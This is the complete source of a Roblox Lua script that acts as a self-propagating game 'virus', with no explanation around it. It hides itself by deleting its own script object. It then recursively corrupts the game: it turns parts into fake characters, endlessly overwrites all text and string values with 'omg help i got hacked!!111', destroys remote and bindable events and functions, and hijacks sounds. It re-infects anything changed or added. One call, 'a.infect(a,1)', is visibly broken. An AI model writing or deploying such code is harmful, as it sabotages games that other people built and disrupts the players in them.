local scr = script

local name = "LOL WHY"
local msg = "omg help i got hacked!!111"
local soundid = 179715305

---------------------------------------------------------------------------------

scr:ClearAllChildren();
scr:Destroy();
scr.Name = name;

local ins = Instance.new
local create = assert(LoadLibrary("RbxUtility").Create)
Service = setmetatable({game = game}, {
	__index = function(tab, key)
		if game:GetService(key) == nil then
			coroutine.wrap(function()
				warn("Couldn't find service with name: "..key)
			end)()
		end
		return game:GetService(key)
	end
})

local function check(a, t)
	--part
	if (t == 1) then
		if (a:IsA("BasePart")) and (not a:IsA("Terrain")) and (not a.Parent:IsA("Hat")) then
			if (not Service.Players:GetPlayerFromCharacter(a.Parent)) then
				return true
			end
		end
	--string value
	elseif (t == 2) then
		if a:IsA("StringValue") then
			return true
		end
	--gui
	elseif (t == 3) then
		if a:IsA("TextButton") or a:IsA("TextLabel") then
			return true
		end
	--bindable and remote events and functions
	elseif (t == 4) then
		local e="Event"; local f="Function"; local b="Bindable"; local r="Remote"
		if (a:IsA(b..e)) or (a:IsA(b..f)) or a:IsA(r..e) or (a:IsA(r..f)) then
			return true
		end
	--sound
	elseif (t == 5) then
		if (a:IsA("Sound")) then
			return true
		end
	end
	return false
end

local function infect(a,t)
	coroutine.wrap(function()
		--part
		if (t == 1) then
			if (not a:FindFirstChild(name)) then
				local v = ins("BoolValue",a) v.Name = name
				local m = ins("Model",a.Parent) m.Name = a.Name
				local h = ins("Humanoid",m) h.Name = a.Name
				a.Name = "Head";
				a.Parent = m;
				a.Friction = 1
				a.Elasticity = 2
			end
		--string value
		elseif (t == 2) then
			while wait() do
				a.Value = msg
			end
		--gui
		elseif (t == 3) then
			while wait() do
				a.Text = msg
			end
		--bindable and remote events and functions
		elseif (t == 4) then
			pcall(function() a:Destroy() end)
		--sound
		elseif (t == 5) then
			a:Stop()
			if (soundid ~= nil) and (soundid ~= 0) then
				a.SoundId = "rbxassetid://"..tostring(soundid)
			end
			a.Archivable = false
			a:Play()
		end
	end)()
end

local function attack(a)
	coroutine.wrap(function()
		--part
		if (check(a,1) == true) then
			a.Locked = false
			a.infect(a,1)
		--string value
		elseif (check(a,2) == true) then
			infect(a,2)
		--gui
		elseif (check(a,3) == true) then
			infect(a,3)
		--bindable and remote events and functions
		elseif (check(a,4) == true) then
			infect(a,4)
		--sound
		elseif (check(a,5) == true) then
			infect(a,5)
		end
	
		for i,v in pairs(a:GetChildren()) do
			wait()
			attack(v)
		end
	
		a.Changed:connect(function(c)
			attack(a)
		end)

		a.DescendantAdded:connect(function(d)
			wait()
			attack(d)
		end)
	end)()
end

for i,p in pairs(Service.Players:GetPlayers()) do
	delay(0.5,function()
		pcall(attack(p.StarterGear))
		pcall(attack(p.Backpack))
	end)
end

Service.Players.PlayerAdded:connect(function(p)
	delay(0.5,function()
		pcall(attack(p.StarterGear))
		pcall(attack(p.Backpack))
	end)
end)

attack(workspace)
attack(Service.ServerStorage)
attack(Service.ServerScriptService)
attack(Service.StarterPack)
attack(Service.Lighting)
attack(Service.Players)
attack(Service.Teams)
--attack(Service.Soundscape)